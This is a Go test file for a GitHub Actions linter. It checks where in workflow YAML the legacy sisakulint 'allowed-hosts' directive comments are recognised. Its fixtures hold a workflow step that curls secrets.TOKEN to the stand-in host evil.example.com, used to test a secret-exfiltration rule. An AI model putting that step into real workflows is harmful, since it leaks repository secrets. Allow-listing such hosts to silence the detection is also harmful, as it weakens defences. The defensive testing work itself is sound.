package cli

import (
	"reflect"
	"strings"
	"testing"
)

// The places of a directive that sisakulint 0.x 17c2d821 was run with,
// on 2026-11-06: in a workflow whose step sends secrets.TOKEN to
// evil.example.com, sisakulint 0.x allowed the host (exit 0) or did not
// (exit 1). D is the directive, S the steps.
const (
	directiveD = "# sisakulint:secret-exfiltration.allowed-hosts: evil.example.com"
	directiveS = "      - run: curl -d \"${{ secrets.TOKEN }}\" https://evil.example.com/x\n"
	directiveJ = "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
)

var directivePlaces = []struct {
	name     string
	content  string
	upstream bool // sisakulint 0.x allowed the host
	taken    bool // this linter writes the host
}{
	{"head", directiveD + "\non: push\npermissions: {}\n" + directiveJ + directiveS, true, true},
	{"online", "on: push " + directiveD + "\npermissions: {}\n" + directiveJ + directiveS, true, true},
	{"beforejobs", "on: push\npermissions: {}\n" + directiveD + "\n" + directiveJ + directiveS, true, true},
	{"eof", "on: push\npermissions: {}\n" + directiveJ + directiveS + directiveD + "\n", false, false},
	{"instep", "on: push\npermissions: {}\n" + directiveJ + "      " + directiveD + "\n" + directiveS, false, false},
	{"col0injobs", "on: push\npermissions: {}\njobs:\n" + directiveD + "\n  a:\n    runs-on: ubuntu-latest\n    steps:\n" + directiveS, false, false},
	{"col0insteps", "on: push\npermissions: {}\njobs:\n  a:\n    runs-on: ubuntu-latest\n" + directiveD + "\n    steps:\n" + directiveS, false, false},
	{"jobsline", "on: push\npermissions: {}\njobs: " + directiveD + "\n  a:\n    runs-on: ubuntu-latest\n    steps:\n" + directiveS, true, true},
	{"indentedtop", "  " + directiveD + "\non: push\npermissions: {}\n" + directiveJ + directiveS, true, false},
	{"headblank", directiveD + "\n\non: push\npermissions: {}\n" + directiveJ + directiveS, true, true},
	{"midblank", "on: push\npermissions: {}\n" + directiveD + "\n\n" + directiveJ + directiveS, true, true},
	{"afterjobsblankkey", "on: push\n" + directiveJ + directiveS + directiveD + "\n\npermissions: {}\n", true, true},
	{"afterjobskey", "on: push\n" + directiveJ + directiveS + directiveD + "\npermissions: {}\n", true, true},
	{"valueline", "on: push\npermissions: {} " + directiveD + "\n" + directiveJ + directiveS, true, true},
	{"onblockvalue", "on:\n  push: " + directiveD + "\npermissions: {}\n" + directiveJ + directiveS, false, false},
	{"twolines", "# x\n" + directiveD + "\non: push\npermissions: {}\n" + directiveJ + directiveS, true, true},
	{"eofscalar", "on: push\n" + directiveJ + directiveS + "permissions: {}\n" + directiveD + "\n", true, false},
	{"eofscalarblank", "on: push\n" + directiveJ + directiveS + "permissions: {}\n\n" + directiveD + "\n", true, false},
	{"indentbeforekey", "on: push\n" + directiveJ + directiveS + "      " + directiveD + "\npermissions: {}\n", false, false},
	{"eofblank", "on: push\npermissions: {}\n" + directiveJ + directiveS + "\n" + directiveD + "\n", true, false},
	{"docstart", "---\n" + directiveD + "\non: push\npermissions: {}\n" + directiveJ + directiveS, true, true},
	{"nospace", "#sisakulint:secret-exfiltration.allowed-hosts: evil.example.com\non: push\npermissions: {}\n" + directiveJ + directiveS, true, true},
	{"midtext", "# note sisakulint:secret-exfiltration.allowed-hosts: evil.example.com\non: push\npermissions: {}\n" + directiveJ + directiveS, true, true},
	// Run with sisakulint 0.x
	// 17c2d821 the same way: a comment at the end of the line of a key whose
	// value goes on, or has a tag or an anchor before the comment.
	{"flowmapopen", "on: push\npermissions: { " + directiveD + "\n  contents: read }\n" + directiveJ + directiveS, false, false},
	{"flowseqopen", "on: [push, " + directiveD + "\n  pull_request]\npermissions: {}\n" + directiveJ + directiveS, false, false},
	{"tagged", "on: push\npermissions: !!map " + directiveD + "\n  contents: read\n" + directiveJ + directiveS, false, false},
	{"anchored", "on: push\npermissions: {}\njobs: &j " + directiveD + "\n  a:\n    runs-on: ubuntu-latest\n    steps:\n" + directiveS, false, false},
}

func TestLegacyDirectives(t *testing.T) {
	for _, crlf := range []bool{false, true} {
		for _, p := range directivePlaces {
			if p.taken && !p.upstream {
				t.Fatalf("%s: a place that sisakulint 0.x does not read is taken", p.name)
			}
			content := p.content
			if crlf {
				content = strings.ReplaceAll(content, "\n", "\r\n")
			}
			taken, left := legacyDirectives([]byte(content))
			var got []string
			for _, i := range taken {
				got = append(got, i.text)
			}
			switch {
			case p.taken && (!reflect.DeepEqual(got, []string{"evil.example.com"}) || len(left) != 0):
				t.Errorf("%s (crlf %v): taken %q, left %+v; want evil.example.com taken", p.name, crlf, got, left)
			case !p.taken && (len(taken) != 0 || len(left) != 1):
				t.Errorf("%s (crlf %v): taken %q, left %+v; want the directive left", p.name, crlf, got, left)
			}
			for _, i := range append(taken, left...) {
				if line := strings.Split(strings.ReplaceAll(content, "\r\n", "\n"), "\n")[i.line-1]; !strings.Contains(line, "sisakulint:") {
					t.Errorf("%s: line %d is %q, not the directive", p.name, i.line, line)
				}
			}
		}
	}
}

// TestLegacyDirectivesBareCR: YAML reads a CR alone as a line break, as
// the lines of the syntax tree count it (lines split at LF only once went
// out of step and --init panicked).
func TestLegacyDirectivesBareCR(t *testing.T) {
	for _, content := range []string{
		"on: push\rpermissions: {}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\nname: x " + directiveD + "\n",
		strings.ReplaceAll(directiveD+"\non: push\npermissions: {}\n"+directiveJ+directiveS, "\n", "\r"),
	} {
		taken, left := legacyDirectives([]byte(content))
		if len(taken) != 1 || taken[0].text != "evil.example.com" || len(left) != 0 {
			t.Errorf("%q: taken %+v, left %+v", content, taken, left)
		}
	}
}

func TestLegacyDirectiveText(t *testing.T) {
	taken, _ := legacyDirectives([]byte("# sisakulint:secret-exfiltration.allowed-hosts: a.example.com, , *.b.example.com ,c d\non: push\n"))
	var got []string
	for _, i := range taken {
		got = append(got, i.text)
	}
	if want := []string{"a.example.com", "*.b.example.com", "c d"}; !reflect.DeepEqual(got, want) {
		t.Errorf("taken = %q, want %q", got, want)
	}
	taken, left := legacyDirectives([]byte("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"# sisakulint:secret-exfiltration.allowed-hosts: x\"\n"))
	if len(taken) != 0 || len(left) != 0 {
		t.Errorf("a directive in a string: taken %+v, left %+v", taken, left)
	}
	taken, left = legacyDirectives([]byte("on: push\nname: \"# sisakulint:secret-exfiltration.allowed-hosts: x\"\n"))
	if len(taken) != 0 || len(left) != 0 {
		t.Errorf("a directive in a string of a top level key: taken %+v, left %+v", taken, left)
	}
}
